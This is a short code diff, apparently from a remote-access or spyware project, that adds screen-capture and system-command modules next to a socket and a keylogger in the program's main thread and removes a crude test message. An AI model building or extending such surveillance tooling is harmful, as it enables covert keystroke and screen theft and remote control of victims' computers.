@@ -6,19 +6,18 @@ extern addonThread* gThread;
 extern addonMutex* gMutex;
 addonSocket* gSocket;
 addonKeylog* gKeylog;
+addonScreen* gScreen;
+addonSysexec* gSysexec;
 
 
 
 
-DWORD _stdcall main_thread(void* lpParam)
+DWORD _stdcall main_thread(LPVOID lpParam)
 {
 	gSocket = new addonSocket();
-
-	gSocket->Send(std::string("ololo motherfuck!1"));
-
 	gKeylog = new addonKeylog();
-
-	//CaptureBMP(L"screen.bmp");
+	gScreen = new addonScreen();
+	gSysexec = new addonSysexec();
 
 	return 1;
 }
